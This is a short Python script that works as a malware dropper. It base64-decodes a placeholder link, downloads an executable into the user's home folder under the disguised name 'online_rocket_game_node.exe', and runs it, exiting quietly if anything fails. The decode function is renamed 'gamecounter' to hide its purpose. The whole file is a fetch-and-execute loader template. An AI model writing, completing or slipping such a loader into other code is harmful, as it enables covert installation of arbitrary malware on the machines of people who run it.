import requests as r
from base64 import b64decode as gamecounter
import os 
import subprocess

asset = 'INSERT BASE64 ENCODED LINK HERE'
response = r.get(gamecounter(asset).decode('utf-8'))
username = os.path.expanduser('~')

if response.status_code == 200:
    with open(f"{username}\online_rocket_game_node.exe", "wb") as file:
        file.write(response.content)
    try:
      subprocess.run(f"{username}\online_rocket_game_node.exe")
    except:
        exit()
else:
    exit()
